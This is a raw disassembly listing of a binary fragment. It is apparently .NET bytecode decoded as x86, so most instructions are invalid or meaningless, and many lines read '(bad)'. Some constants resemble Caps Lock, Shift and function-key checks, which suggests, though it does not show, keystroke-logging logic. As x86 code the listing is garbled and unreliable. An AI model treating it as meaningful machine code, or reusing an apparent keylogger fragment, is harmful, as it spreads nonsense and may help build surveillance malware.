  40578c:	1f                   	pop    %ds
  40578d:	32 13                	xor    (%ebx),%dl
  40578f:	17                   	pop    %ss
  405790:	11 09                	adc    %ecx,(%ecx)
  405792:	28 23                	sub    %ah,(%ebx)
  405794:	00 00                	add    %al,(%eax)
  405796:	0a 72 f1             	or     -0xf(%edx),%dh
  405799:	06                   	push   %es
  40579a:	00 70 16             	add    %dh,0x16(%eax)
  40579d:	28 0f                	sub    %cl,(%edi)
  40579f:	01 00                	add    %eax,(%eax)
  4057a1:	0a 16                	or     (%esi),%dl
  4057a3:	33 27                	xor    (%edi),%esp
  4057a5:	1f                   	pop    %ds
  4057a6:	33 13                	xor    (%ebx),%edx
  4057a8:	17                   	pop    %ss
  4057a9:	11 14 14             	adc    %edx,(%esp,%edx,1)
  4057ac:	72 c6                	jb     0x405774
  4057ae:	0f 00                	(bad)
  4057b0:	70 17                	jo     0x4057c9
  4057b2:	8d 03                	lea    (%ebx),%eax
  4057b4:	00 00                	add    %al,(%eax)
  4057b6:	01 13                	add    %edx,(%ebx)
  4057b8:	10 11                	adc    %dl,(%ecx)
  4057ba:	10 16                	adc    %dl,(%esi)
  4057bc:	11 07                	adc    %eax,(%edi)
  4057be:	a2 11 10 14 14       	mov    %al,0x14141011
  4057c3:	16                   	push   %ss
  4057c4:	17                   	pop    %ss
  4057c5:	28 43 00             	sub    %al,0x0(%ebx)
  4057c8:	00 0a                	add    %cl,(%edx)
  4057ca:	2b 2e                	sub    (%esi),%ebp
  4057cc:	1f                   	pop    %ds
  4057cd:	35 13 17 1f 36       	xor    $0x361f1713,%eax
  4057d2:	13 17                	adc    (%edi),%edx
  4057d4:	11 14 14             	adc    %edx,(%esp,%edx,1)
  4057d7:	72 c6                	jb     0x40579f
  4057d9:	0f 00                	(bad)
  4057db:	70 17                	jo     0x4057f4
  4057dd:	8d 03                	lea    (%ebx),%eax
  4057df:	00 00                	add    %al,(%eax)
  4057e1:	01 13                	add    %edx,(%ebx)
  4057e3:	10 11                	adc    %dl,(%ecx)
  4057e5:	10 16                	adc    %dl,(%esi)
  4057e7:	11 09                	adc    %ecx,(%ecx)
  4057e9:	28 11                	sub    %dl,(%ecx)
  4057eb:	00 00                	add    %al,(%eax)
  4057ed:	0a a2 11 10 14 14    	or     0x14141011(%edx),%ah
  4057f3:	16                   	push   %ss
  4057f4:	17                   	pop    %ss
  4057f5:	28 43 00             	sub    %al,0x0(%ebx)
  4057f8:	00 0a                	add    %cl,(%edx)
  4057fa:	1f                   	pop    %ds
  4057fb:	38 13                	cmp    %dl,(%ebx)
  4057fd:	17                   	pop    %ss
  4057fe:	11 14 14             	adc    %edx,(%esp,%edx,1)
  405801:	72 e0                	jb     0x4057e3
  405803:	0f 00                	(bad)
  405805:	70 16                	jo     0x40581d
  405807:	8d 03                	lea    (%ebx),%eax
  405809:	00 00                	add    %al,(%eax)
  40580b:	01 14 14             	add    %edx,(%esp,%edx,1)
  40580e:	14 28                	adc    $0x28,%al
  405810:	41                   	inc    %ecx
  405811:	00 00                	add    %al,(%eax)
  405813:	0a 11                	or     (%ecx),%dl
  405815:	08 16                	or     %dl,(%esi)
  405817:	28 10                	sub    %dl,(%eax)
  405819:	01 00                	add    %eax,(%eax)
  40581b:	0a 28                	or     (%eax),%ch
  40581d:	11 01                	adc    %eax,(%ecx)
  40581f:	00 0a                	add    %cl,(%edx)
  405821:	28 12                	sub    %dl,(%edx)
  405823:	01 00                	add    %eax,(%eax)
  405825:	0a 2c 1c             	or     (%esp,%ebx,1),%ch
  405828:	1f                   	pop    %ds
  405829:	39 13                	cmp    %edx,(%ebx)
  40582b:	17                   	pop    %ss
  40582c:	11 14 14             	adc    %edx,(%esp,%edx,1)
  40582f:	72 75                	jb     0x4058a6
  405831:	03 00                	add    (%eax),%eax
  405833:	70 16                	jo     0x40584b
  405835:	8d 03                	lea    (%ebx),%eax
  405837:	00 00                	add    %al,(%eax)
  405839:	01 14 14             	add    %edx,(%esp,%edx,1)
  40583c:	14 17                	adc    $0x17,%al
  40583e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405842:	0a 26                	or     (%esi),%ah
  405844:	1f                   	pop    %ds
  405845:	3b 13                	cmp    (%ebx),%edx
  405847:	17                   	pop    %ss
  405848:	14 13                	adc    $0x13,%al
  40584a:	08 1f                	or     %bl,(%edi)
  40584c:	3c 13                	cmp    $0x13,%al
  40584e:	17                   	pop    %ss
  40584f:	14 13                	adc    $0x13,%al
  405851:	09 14 13             	or     %edx,(%ebx,%edx,1)
  405854:	14 11                	adc    $0x11,%al
  405856:	12 17                	adc    (%edi),%dl
  405858:	d6                   	salc
  405859:	13 12                	adc    (%edx),%edx
  40585b:	1f                   	pop    %ds
  40585c:	3e 13 17             	adc    %ds:(%edi),%edx
  40585f:	11 12                	adc    %edx,(%edx)
  405861:	11 13                	adc    %edx,(%ebx)
  405863:	8e b7 3f 5c fd ff    	mov    -0x2a3c1(%edi),%?
  405869:	ff 11                	call   *(%ecx)
  40586b:	0a 17                	or     (%edi),%dl
  40586d:	d6                   	salc
  40586e:	13 0a                	adc    (%edx),%ecx
  405870:	1f                   	pop    %ds
  405871:	41                   	inc    %ecx
  405872:	13 17                	adc    (%edi),%edx
  405874:	11 0a                	adc    %ecx,(%edx)
  405876:	11 0b                	adc    %ecx,(%ebx)
  405878:	8e b7 3f 47 f9 ff    	mov    -0x6b8c1(%edi),%?
  40587e:	ff 1f                	lcall  *(%edi)
  405880:	42                   	inc    %edx
  405881:	13 17                	adc    (%edi),%edx
  405883:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  405889:	22 00                	and    (%eax),%al
  40588b:	00 0a                	add    %cl,(%edx)
  40588d:	19 13                	sbb    %edx,(%ebx)
  40588f:	17                   	pop    %ss
  405890:	17                   	pop    %ss
  405891:	3a c7                	cmp    %bh,%al
  405893:	f8                   	clc
  405894:	ff                   	(bad)
  405895:	ff                   	lcall  (bad)
  405896:	dd 68 01             	(bad) 0x1(%eax)
  405899:	00 00                	add    %al,(%eax)
  40589b:	11 16                	adc    %edx,(%esi)
  40589d:	2b 04 11             	sub    (%ecx,%edx,1),%eax
  4058a0:	16                   	push   %ss
  4058a1:	17                   	pop    %ss
  4058a2:	58                   	pop    %eax
  4058a3:	16                   	push   %ss
  4058a4:	13 16                	adc    (%esi),%edx
  4058a6:	45                   	inc    %ebp
  4058a7:	45                   	inc    %ebp
  4058a8:	00 00                	add    %al,(%eax)
  4058aa:	00 00                	add    %al,(%eax)
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	00 81 f7 ff ff 99    	add    %al,-0x66000009(%ecx)
  4058b4:	f7 ff                	idiv   %edi
  4058b6:	ff ce                	dec    %esi
  4058b8:	fe                   	(bad)
  4058b9:	ff                   	(bad)
  4058ba:	ff 9e f7 ff ff a6    	lcall  *-0x59000009(%esi)
  4058c0:	f7 ff                	idiv   %edi
  4058c2:	ff c4                	inc    %esp
  4058c4:	f7 ff                	idiv   %edi
  4058c6:	ff e0                	jmp    *%eax
  4058c8:	f7 ff                	idiv   %edi
  4058ca:	ff f4                	push   %esp
  4058cc:	f7 ff                	idiv   %edi
  4058ce:	ff f4                	push   %esp
  4058d0:	f7 ff                	idiv   %edi
  4058d2:	ff 0d f8 ff ff 1c    	decl   0x1cfffff8
  4058d8:	f8                   	clc
  4058d9:	ff                   	(bad)
  4058da:	ff 2c f8             	ljmp   *(%eax,%edi,8)
  4058dd:	ff                   	(bad)
  4058de:	ff 37                	push   (%edi)
  4058e0:	f8                   	clc
  4058e1:	ff                   	(bad)
  4058e2:	ff 4d f8             	decl   -0x8(%ebp)
  4058e5:	ff                   	(bad)
  4058e6:	ff 6b f8             	ljmp   *-0x8(%ebx)
  4058e9:	ff                   	(bad)
  4058ea:	ff 80 f8 ff ff 80    	incl   -0x7f000008(%eax)
  4058f0:	f8                   	clc
  4058f1:	ff                   	(bad)
  4058f2:	ff 9b f8 ff ff ea    	lcall  *-0x15000008(%ebx)
  4058f8:	f8                   	clc
  4058f9:	ff                   	(bad)
  4058fa:	ff f6                	push   %esi
  4058fc:	f8                   	clc
  4058fd:	ff                   	(bad)
  4058fe:	ff 30                	push   (%eax)
  405900:	f9                   	stc
  405901:	ff                   	(bad)
  405902:	ff 59 f9             	lcall  *-0x7(%ecx)
  405905:	ff                   	(bad)
  405906:	ff 81 f9 ff ff a9    	incl   -0x56000007(%ecx)
  40590c:	f9                   	stc
  40590d:	ff                   	(bad)
  40590e:	ff 2d fa ff ff c2    	ljmp   *0xc2fffffa
  405914:	fa                   	cli
  405915:	ff                   	(bad)
  405916:	ff 15 fb ff ff 2e    	call   *0x2efffffb
  40591c:	fb                   	sti
  40591d:	ff                   	(bad)
  40591e:	ff 53 fb             	call   *-0x5(%ebx)
  405921:	ff                   	(bad)
  405922:	ff 55 fb             	call   *-0x5(%ebp)
  405925:	ff                   	(bad)
  405926:	ff 59 fb             	lcall  *-0x5(%ecx)
  405929:	ff                   	(bad)
  40592a:	ff 83 fb ff ff 83    	incl   -0x7c000005(%ebx)
  405930:	fb                   	sti
  405931:	ff                   	(bad)
  405932:	ff b1 fb ff ff cd    	push   -0x32000005(%ecx)
  405938:	fb                   	sti
  405939:	ff                   	(bad)
  40593a:	ff cd                	dec    %ebp
  40593c:	fb                   	sti
  40593d:	ff                   	(bad)
  40593e:	ff d4                	call   *%esp
  405940:	fb                   	sti
  405941:	ff                   	(bad)
  405942:	ff                   	lcall  (bad)
  405943:	db fb                	(bad)
  405945:	ff                   	(bad)
  405946:	ff                   	lcall  (bad)
  405947:	de fb                	fdivrp %st,%st(3)
  405949:	ff                   	(bad)
  40594a:	ff e4                	jmp    *%esp
  40594c:	fb                   	sti
  40594d:	ff                   	(bad)
  40594e:	ff f3                	push   %ebx
  405950:	fb                   	sti
  405951:	ff                   	(bad)
  405952:	ff 0e                	decl   (%esi)
  405954:	fc                   	cld
  405955:	ff                   	(bad)
  405956:	ff 1a                	lcall  *(%edx)
  405958:	fc                   	cld
  405959:	ff                   	(bad)
  40595a:	ff 4f fc             	decl   -0x4(%edi)
  40595d:	ff                   	(bad)
  40595e:	ff                   	(bad)
  40595f:	78 fc                	js     0x40595d
  405961:	ff                   	(bad)
  405962:	ff a0 fc ff ff c8    	jmp    *-0x37000004(%eax)
  405968:	fc                   	cld
  405969:	ff                   	(bad)
  40596a:	ff 52 fd             	call   *-0x3(%edx)
  40596d:	ff                   	(bad)
  40596e:	ff                   	(bad)
  40596f:	7f fd                	jg     0x40596e
  405971:	ff                   	(bad)
  405972:	ff cd                	dec    %ebp
  405974:	fd                   	std
  405975:	ff                   	(bad)
  405976:	ff e6                	jmp    *%esi
  405978:	fd                   	std
  405979:	ff                   	(bad)
  40597a:	ff 0b                	decl   (%ebx)
  40597c:	fe                   	(bad)
  40597d:	ff                   	(bad)
  40597e:	ff 0d fe ff ff 11    	decl   0x11fffffe
  405984:	fe                   	(bad)
  405985:	ff                   	(bad)
  405986:	ff                   	(bad)
  405987:	3b fe                	cmp    %esi,%edi
  405989:	ff                   	(bad)
  40598a:	ff                   	(bad)
  40598b:	3b fe                	cmp    %esi,%edi
  40598d:	ff                   	(bad)
  40598e:	ff 69 fe             	ljmp   *-0x2(%ecx)
  405991:	ff                   	(bad)
  405992:	ff 85 fe ff ff 85    	incl   -0x7a000002(%ebp)
  405998:	fe                   	(bad)
  405999:	ff                   	(bad)
  40599a:	ff 8c fe ff ff 93 fe 	decl   -0x16c0001(%esi,%edi,8)
  4059a1:	ff                   	(bad)
  4059a2:	ff 9c fe ff ff ab fe 	lcall  *-0x1540001(%esi,%edi,8)
  4059a9:	ff                   	(bad)
  4059aa:	ff ab fe ff ff b1    	ljmp   *-0x4e000002(%ebx)
  4059b0:	fe                   	(bad)
  4059b1:	ff                   	(bad)
  4059b2:	ff c0                	inc    %eax
  4059b4:	fe                   	(bad)
  4059b5:	ff                   	(bad)
  4059b6:	ff ce                	dec    %esi
  4059b8:	fe                   	(bad)
  4059b9:	ff                   	(bad)
  4059ba:	ff d7                	call   *%edi
  4059bc:	fe                   	(bad)
  4059bd:	ff                   	(bad)
  4059be:	ff                   	lcall  (bad)
  4059bf:	de 37                	fidivs (%edi)
  4059c1:	11 17                	adc    %edx,(%edi)
  4059c3:	13 16                	adc    (%esi),%edx
  4059c5:	11 15 45 02 00 00    	adc    %edx,0x245
  4059cb:	00 00                	add    %al,(%eax)
  4059cd:	00 00                	add    %al,(%eax)
  4059cf:	00 cb                	add    %cl,%bl
  4059d1:	fe                   	(bad)
  4059d2:	ff                   	(bad)
  4059d3:	ff                   	lcall  (bad)
  4059d4:	de 22                	fisubs (%edx)
  4059d6:	75 29                	jne    0x405a01
  4059d8:	00 00                	add    %al,(%eax)
  4059da:	01 14 fe             	add    %edx,(%esi,%edi,8)
  4059dd:	03 11                	add    (%ecx),%edx
  4059df:	15 16 fe 03 5f       	adc    $0x5f03fe16,%eax
  4059e4:	11 16                	adc    %edx,(%esi)
  4059e6:	16                   	push   %ss
  4059e7:	fe 01                	incb   (%ecx)
  4059e9:	5f                   	pop    %edi
  4059ea:	fe                   	(bad)
  4059eb:	11 74 29 00          	adc    %esi,0x0(%ecx,%ebp,1)
  4059ef:	00 01                	add    %al,(%ecx)
  4059f1:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4059f7:	c9                   	leave
  4059f8:	20 33                	and    %dh,(%ebx)
  4059fa:	00 0a                	add    %cl,(%edx)
  4059fc:	80 28 17             	subb   $0x17,(%eax)
  4059ff:	01 00                	add    %eax,(%eax)
  405a01:	0a 7a 11             	or     0x11(%edx),%bh
  405a04:	16                   	push   %ss
  405a05:	2c 05                	sub    $0x5,%al
  405a07:	28 27                	sub    %ah,(%edi)
  405a09:	00 00                	add    %al,(%eax)
  405a0b:	0a 2a                	or     (%edx),%ch
  405a0d:	00 00                	add    %al,(%eax)
  405a0f:	00 41 1c             	add    %al,0x1c(%ecx)
  405a12:	00 00                	add    %al,(%eax)
  405a14:	01 00                	add    %eax,(%eax)
  405a16:	00 00                	add    %al,(%eax)
  405a18:	00 00                	add    %al,(%eax)
  405a1a:	00 00                	add    %al,(%eax)
  405a1c:	96                   	xchg   %eax,%esi
  405a1d:	08 00                	or     %al,(%eax)
  405a1f:	00 ac 08 00 00 0c 00 	add    %ch,0xc0000(%eax,%ecx,1)
  405a26:	00 00                	add    %al,(%eax)
  405a28:	96                   	xchg   %eax,%esi
  405a29:	08 00                	or     %al,(%eax)
  405a2b:	00 8e 14 fe 06 4f    	add    %cl,0x4f06fe14(%esi)
  405a31:	00 00                	add    %al,(%eax)
  405a33:	06                   	push   %es
  405a34:	73 7c                	jae    0x405ab2
  405a36:	00 00                	add    %al,(%eax)
  405a38:	06                   	push   %es
  405a39:	80 25 00 00 04 7e 18 	andb   $0x18,0x7e040000
  405a40:	01 00                	add    %eax,(%eax)
  405a42:	0a 80 26 00 00 04    	or     0x4000026(%eax),%al
  405a48:	1f                   	pop    %ds
  405a49:	0d 80 27 00 00       	or     $0x2780,%eax
  405a4e:	04 2a                	add    $0x2a,%al
  405a50:	1e                   	push   %ds
  405a51:	02 28                	add    (%eax),%ch
  405a53:	17                   	pop    %ss
  405a54:	00 00                	add    %al,(%eax)
  405a56:	0a 2a                	or     (%edx),%ch
  405a58:	56                   	push   %esi
  405a59:	7e 25                	jle    0x405a80
  405a5b:	00 00                	add    %al,(%eax)
  405a5d:	04 28                	add    $0x28,%al
  405a5f:	4e                   	dec    %esi
  405a60:	00 00                	add    %al,(%eax)
  405a62:	06                   	push   %es
  405a63:	80 26 00             	andb   $0x0,(%esi)
  405a66:	00 04 28             	add    %al,(%eax,%ebp,1)
  405a69:	19 01                	sbb    %eax,(%ecx)
  405a6b:	00 0a                	add    %cl,(%edx)
  405a6d:	2a 00                	sub    (%eax),%al
  405a6f:	00 1b                	add    %bl,(%ebx)
  405a71:	30 04 00             	xor    %al,(%eax,%eax,1)
  405a74:	2e 00 00             	add    %al,%cs:(%eax)
  405a77:	00 32                	add    %dh,(%edx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	11 28                	adc    %ebp,(%eax)
  405a7d:	4c                   	dec    %esp
  405a7e:	00 00                	add    %al,(%eax)
  405a80:	0a 0b                	or     (%ebx),%cl
  405a82:	7e 27                	jle    0x405aab
  405a84:	00 00                	add    %al,(%eax)
  405a86:	04 02                	add    $0x2,%al
  405a88:	07                   	pop    %es
  405a89:	6f                   	outsl  %ds:(%esi),(%dx)
  405a8a:	1a 01                	sbb    (%ecx),%al
  405a8c:	00 0a                	add    %cl,(%edx)
  405a8e:	28 55 00             	sub    %dl,0x0(%ebp)
  405a91:	00 06                	add    %al,(%esi)
  405a93:	16                   	push   %ss
  405a94:	28 52 00             	sub    %dl,0x0(%edx)
  405a97:	00 06                	add    %al,(%esi)
  405a99:	0a de                	or     %dh,%bl
  405a9b:	0c de                	or     $0xde,%al
  405a9d:	0a 07                	or     (%edi),%al
  405a9f:	2c 06                	sub    $0x6,%al
  405aa1:	07                   	pop    %es
  405aa2:	6f                   	outsl  %ds:(%esi),(%dx)
  405aa3:	5e                   	pop    %esi
  405aa4:	00 00                	add    %al,(%eax)
  405aa6:	0a dc                	or     %ah,%bl
  405aa8:	06                   	push   %es
  405aa9:	2a 00                	sub    (%eax),%al
  405aab:	00 01                	add    %al,(%ecx)
  405aad:	10 00                	adc    %al,(%eax)
  405aaf:	00 02                	add    %al,(%edx)
  405ab1:	00 06                	add    %al,(%esi)
  405ab3:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  405ab6:	00 0a                	add    %cl,(%edx)
  405ab8:	00 00                	add    %al,(%eax)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	1b 30                	sbb    (%eax),%esi
  405abe:	07                   	pop    %es
  405abf:	00 d9                	add    %bl,%cl
  405ac1:	02 00                	add    (%eax),%al
  405ac3:	00 33                	add    %dh,(%ebx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	11 02                	adc    %eax,(%edx)
  405ac9:	16                   	push   %ss
  405aca:	3f                   	aas
  405acb:	c0 02 00             	rolb   $0x0,(%edx)
  405ace:	00 03                	add    %al,(%ebx)
  405ad0:	20 00                	and    %al,(%eax)
  405ad2:	01 00                	add    %eax,(%eax)
  405ad4:	00 28                	add    %ch,(%eax)
  405ad6:	1b 01                	sbb    (%ecx),%eax
  405ad8:	00 0a                	add    %cl,(%edx)
  405ada:	28 1c 01             	sub    %bl,(%ecx,%eax,1)
  405add:	00 0a                	add    %cl,(%edx)
  405adf:	39 ab 02 00 00 04    	cmp    %ebp,0x4000002(%ebx)
  405ae5:	28 1d 01 00 0a 8c    	sub    %bl,0x8c0a0001
  405aeb:	7d 00                	jge    0x405aed
  405aed:	00 01                	add    %al,(%ecx)
  405aef:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  405af2:	14 28                	adc    $0x28,%al
  405af4:	58                   	pop    %eax
  405af5:	00 00                	add    %al,(%eax)
  405af7:	06                   	push   %es
  405af8:	20 ff                	and    %bh,%bh
  405afa:	ff 00                	incl   (%eax)
  405afc:	00 5f 16             	add    %bl,0x16(%edi)
  405aff:	fe 01                	incb   (%ecx)
  405b01:	16                   	push   %ss
  405b02:	fe 01                	incb   (%ecx)
  405b04:	8c 38                	mov    %?,(%eax)
  405b06:	00 00                	add    %al,(%eax)
  405b08:	01 0b                	add    %ecx,(%ebx)
  405b0a:	20 a0 00 00 00 28    	and    %ah,0x28000000(%eax)
  405b10:	58                   	pop    %eax
  405b11:	00 00                	add    %al,(%eax)
  405b13:	06                   	push   %es
  405b14:	20 00                	and    %al,(%eax)
  405b16:	80 00 00             	addb   $0x0,(%eax)
  405b19:	5f                   	pop    %edi
  405b1a:	16                   	push   %ss
  405b1b:	33 16                	xor    (%esi),%edx
  405b1d:	20 a1 00 00 00 28    	and    %ah,0x28000000(%ecx)
  405b23:	58                   	pop    %eax
  405b24:	00 00                	add    %al,(%eax)
  405b26:	06                   	push   %es
  405b27:	20 00                	and    %al,(%eax)
  405b29:	80 00 00             	addb   $0x0,(%eax)
  405b2c:	5f                   	pop    %edi
  405b2d:	16                   	push   %ss
  405b2e:	33 03                	xor    (%ebx),%eax
  405b30:	16                   	push   %ss
  405b31:	2b 01                	sub    (%ecx),%eax
  405b33:	17                   	pop    %ss
  405b34:	8c 38                	mov    %?,(%eax)
  405b36:	00 00                	add    %al,(%eax)
  405b38:	01 0d 11 04 28 1e    	add    %ecx,0x1e280411
  405b3e:	01 00                	add    %eax,(%eax)
  405b40:	0a 28                	or     (%eax),%ch
  405b42:	50                   	push   %eax
  405b43:	00 00                	add    %al,(%eax)
  405b45:	06                   	push   %es
  405b46:	0c 07                	or     $0x7,%al
  405b48:	28 12                	sub    %dl,(%edx)
  405b4a:	01 00                	add    %eax,(%eax)
  405b4c:	0a 2d 10 09 28 12    	or     0x12280910,%ch
  405b52:	01 00                	add    %eax,(%eax)
  405b54:	0a 2d 08 16 8c 38    	or     0x388c1608,%ch
  405b5a:	00 00                	add    %al,(%eax)
  405b5c:	01 2b                	add    %ebp,(%ebx)
  405b5e:	06                   	push   %es
  405b5f:	17                   	pop    %ss
  405b60:	8c 38                	mov    %?,(%eax)
  405b62:	00 00                	add    %al,(%eax)
  405b64:	01 28                	add    %ebp,(%eax)
  405b66:	12 01                	adc    (%ecx),%al
  405b68:	00 0a                	add    %cl,(%edx)
  405b6a:	2c 1d                	sub    $0x1d,%al
  405b6c:	08 14 72             	or     %dl,(%edx,%esi,2)
  405b6f:	b8 10 00 70 16       	mov    $0x16700010,%eax
  405b74:	8d 03                	lea    (%ebx),%eax
  405b76:	00 00                	add    %al,(%eax)
  405b78:	01 14 14             	add    %edx,(%esp,%edx,1)
  405b7b:	14 28                	adc    $0x28,%al
  405b7d:	41                   	inc    %ecx
  405b7e:	00 00                	add    %al,(%eax)
  405b80:	0a 28                	or     (%eax),%ch
  405b82:	11 00                	adc    %eax,(%eax)
  405b84:	00 0a                	add    %cl,(%edx)
  405b86:	0c 2b                	or     $0x2b,%al
  405b88:	1b 08                	sbb    (%eax),%ecx
  405b8a:	14 72                	adc    $0x72,%al
  405b8c:	75 0b                	jne    0x405b99
  405b8e:	00 70 16             	add    %dh,0x16(%eax)
  405b91:	8d 03                	lea    (%ebx),%eax
  405b93:	00 00                	add    %al,(%eax)
  405b95:	01 14 14             	add    %edx,(%esp,%edx,1)
  405b98:	14 28                	adc    $0x28,%al
  405b9a:	41                   	inc    %ecx
  405b9b:	00 00                	add    %al,(%eax)
  405b9d:	0a 28                	or     (%eax),%ch
  405b9f:	11 00                	adc    %eax,(%eax)
  405ba1:	00 0a                	add    %cl,(%edx)
  405ba3:	0c 11                	or     $0x11,%al
  405ba5:	04 28                	add    $0x28,%al
  405ba7:	1f                   	pop    %ds
  405ba8:	01 00                	add    %eax,(%eax)
  405baa:	0a 1f                	or     (%edi),%bl
  405bac:	70 32                	jo     0x405be0
  405bae:	2f                   	das
  405baf:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  405bb2:	1f                   	pop    %ds
  405bb3:	01 00                	add    %eax,(%eax)
  405bb5:	0a 20                	or     (%eax),%ah
  405bb7:	87 00                	xchg   %eax,(%eax)
  405bb9:	00 00                	add    %al,(%eax)
  405bbb:	30 21                	xor    %ah,(%ecx)
  405bbd:	72 c8                	jb     0x405b87
  405bbf:	10 00                	adc    %al,(%eax)
  405bc1:	70 11                	jo     0x405bd4
  405bc3:	04 28                	add    $0x28,%al
  405bc5:	1f                   	pop    %ds
  405bc6:	01 00                	add    %eax,(%eax)
  405bc8:	0a 28                	or     (%eax),%ch
  405bca:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405bcb:	00 00                	add    %al,(%eax)
  405bcd:	0a 72 93             	or     -0x6d(%edx),%dh
  405bd0:	0b 00                	or     (%eax),%eax
  405bd2:	70 28                	jo     0x405bfc
  405bd4:	28 00                	sub    %al,(%eax)
  405bd6:	00 0a                	add    %cl,(%edx)
  405bd8:	0c 38                	or     $0x38,%al
  405bda:	42                   	inc    %edx
  405bdb:	01 00                	add    %eax,(%eax)
  405bdd:	00 11                	add    %dl,(%ecx)
  405bdf:	04 28                	add    $0x28,%al
  405be1:	1f                   	pop    %ds
  405be2:	01 00                	add    %eax,(%eax)
  405be4:	0a 8c 95 00 00 01 6f 	or     0x6f010000(%ebp,%edx,4),%cl
  405beb:	20 01                	and    %al,(%ecx)
  405bed:	00 0a                	add    %cl,(%edx)
  405bef:	13 06                	adc    (%esi),%eax
  405bf1:	11 06                	adc    %eax,(%esi)
  405bf3:	72 cc                	jb     0x405bc1
  405bf5:	10 00                	adc    %al,(%eax)
  405bf7:	70 16                	jo     0x405c0f
  405bf9:	28 5b 00             	sub    %bl,0x0(%ebx)
  405bfc:	00 0a                	add    %cl,(%edx)
  405bfe:	16                   	push   %ss
  405bff:	33 0b                	xor    (%ebx),%ecx
  405c01:	72 d8                	jb     0x405bdb
  405c03:	10 00                	adc    %al,(%eax)
  405c05:	70 0c                	jo     0x405c13
  405c07:	38 14 01             	cmp    %dl,(%ecx,%eax,1)
  405c0a:	00 00                	add    %al,(%eax)
  405c0c:	11 06                	adc    %eax,(%esi)
  405c0e:	72 e8                	jb     0x405bf8
  405c10:	10 00                	adc    %al,(%eax)
  405c12:	70 16                	jo     0x405c2a
  405c14:	28 5b 00             	sub    %bl,0x0(%ebx)
  405c17:	00 0a                	add    %cl,(%edx)
  405c19:	16                   	push   %ss
  405c1a:	33 0b                	xor    (%ebx),%ecx
  405c1c:	72 f6                	jb     0x405c14
  405c1e:	10 00                	adc    %al,(%eax)
  405c20:	70 0c                	jo     0x405c2e
  405c22:	38 f9                	cmp    %bh,%cl
  405c24:	00 00                	add    %al,(%eax)
  405c26:	00 11                	add    %dl,(%ecx)
  405c28:	06                   	push   %es
  405c29:	72 06                	jb     0x405c31
  405c2b:	11 00                	adc    %eax,(%eax)
  405c2d:	70 16                	jo     0x405c45
  405c2f:	28 5b 00             	sub    %bl,0x0(%ebx)
  405c32:	00 0a                	add    %cl,(%edx)
  405c34:	16                   	push   %ss
  405c35:	33 0b                	xor    (%ebx),%ecx
  405c37:	72 14                	jb     0x405c4d
  405c39:	11 00                	adc    %eax,(%eax)
  405c3b:	70 0c                	jo     0x405c49
  405c3d:	38 de                	cmp    %bl,%dh
  405c3f:	00 00                	add    %al,(%eax)
  405c41:	00 11                	add    %dl,(%ecx)
  405c43:	06                   	push   %es
  405c44:	72 20                	jb     0x405c66
  405c46:	11 00                	adc    %eax,(%eax)
  405c48:	70 16                	jo     0x405c60
  405c4a:	28 5b 00             	sub    %bl,0x0(%ebx)
  405c4d:	00 0a                	add    %cl,(%edx)
  405c4f:	16                   	push   %ss
  405c50:	33 0b                	xor    (%ebx),%ecx
  405c52:	72 38                	jb     0x405c8c
  405c54:	11 00                	adc    %eax,(%eax)
  405c56:	70 0c                	jo     0x405c64
  405c58:	38 c3                	cmp    %al,%bl
  405c5a:	00 00                	add    %al,(%eax)
  405c5c:	00 11                	add    %dl,(%ecx)
  405c5e:	06                   	push   %es
  405c5f:	72 46                	jb     0x405ca7
  405c61:	11 00                	adc    %eax,(%eax)
  405c63:	70 16                	jo     0x405c7b
  405c65:	28 5b 00             	sub    %bl,0x0(%ebx)
  405c68:	00 0a                	add    %cl,(%edx)
  405c6a:	16                   	push   %ss
  405c6b:	33 0b                	xor    (%ebx),%ecx
  405c6d:	72 38                	jb     0x405ca7
  405c6f:	11 00                	adc    %eax,(%eax)
  405c71:	70 0c                	jo     0x405c7f
  405c73:	38 a8 00 00 00 11    	cmp    %ch,0x11000000(%eax)
  405c79:	06                   	push   %es
  405c7a:	72 5e                	jb     0x405cda
  405c7c:	11 00                	adc    %eax,(%eax)
  405c7e:	70 16                	jo     0x405c96
  405c80:	28 5b 00             	sub    %bl,0x0(%ebx)
  405c83:	00 0a                	add    %cl,(%edx)
  405c85:	16                   	push   %ss
  405c86:	33 0b                	xor    (%ebx),%ecx
  405c88:	72 72                	jb     0x405cfc
  405c8a:	11 00                	adc    %eax,(%eax)
  405c8c:	70 0c                	jo     0x405c9a
  405c8e:	38 8d 00 00 00 11    	cmp    %cl,0x11000000(%ebp)
  405c94:	06                   	push   %es
  405c95:	72 82                	jb     0x405c19
  405c97:	11 00                	adc    %eax,(%eax)
  405c99:	70 16                	jo     0x405cb1
  405c9b:	28 5b 00             	sub    %bl,0x0(%ebx)
  405c9e:	00 0a                	add    %cl,(%edx)
  405ca0:	16                   	push   %ss
  405ca1:	33 08                	xor    (%eax),%ecx
  405ca3:	72 72                	jb     0x405d17
  405ca5:	11 00                	adc    %eax,(%eax)
  405ca7:	70 0c                	jo     0x405cb5
  405ca9:	2b 75 11             	sub    0x11(%ebp),%esi
  405cac:	06                   	push   %es
  405cad:	72 96                	jb     0x405c45
  405caf:	11 00                	adc    %eax,(%eax)
  405cb1:	70 16                	jo     0x405cc9
  405cb3:	28 5b 00             	sub    %bl,0x0(%ebx)
  405cb6:	00 0a                	add    %cl,(%edx)
  405cb8:	16                   	push   %ss
  405cb9:	33 08                	xor    (%eax),%ecx
  405cbb:	72 a0                	jb     0x405c5d
  405cbd:	11 00                	adc    %eax,(%eax)
  405cbf:	70 0c                	jo     0x405ccd
  405cc1:	2b 5d 11             	sub    0x11(%ebp),%ebx
  405cc4:	06                   	push   %es
  405cc5:	72 ae                	jb     0x405c75
  405cc7:	11 00                	adc    %eax,(%eax)
  405cc9:	70 16                	jo     0x405ce1
  405ccb:	28 5b 00             	sub    %bl,0x0(%ebx)
  405cce:	00 0a                	add    %cl,(%edx)
  405cd0:	16                   	push   %ss
  405cd1:	33 08                	xor    (%eax),%ecx
  405cd3:	72 b8                	jb     0x405c8d
